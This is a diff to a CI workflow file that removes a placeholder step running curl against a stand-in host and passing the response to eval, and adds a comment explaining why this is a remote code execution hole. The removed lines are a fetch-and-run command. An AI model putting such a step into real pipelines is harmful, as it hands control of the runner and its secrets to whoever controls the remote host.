@@ -107,8 +107,12 @@ jobs:
           ${{ env.workdir }}/src
      
         run: docker build -t semgrep-scanner:latest .
-      - name:
-          blah
-        run: |
-          CONTENTS=$(curl https://blah.com)
-          eval $CONTENTS
+      # Remote code execution via curl-into-eval (CWE-78) removed: the step here fetched
+      # the body of an untrusted endpoint and passed it straight to `eval`, so whoever
+      # controls that endpoint (or any network position in front of it) could run arbitrary
+      # commands on the runner with this workflow's GITHUB_TOKEN and secrets in scope.
+      # Quoting cannot make that safe -- executing downloaded content *is* the vulnerability.
+      # The step had no build purpose (placeholder name, placeholder host, output unused), so
+      # the sink is deleted rather than reimplemented. If a remote artifact is ever needed
+      # here, download it to a file from a pinned URL, verify a known checksum/signature, and
+      # run it as data -- never `eval` a response body.
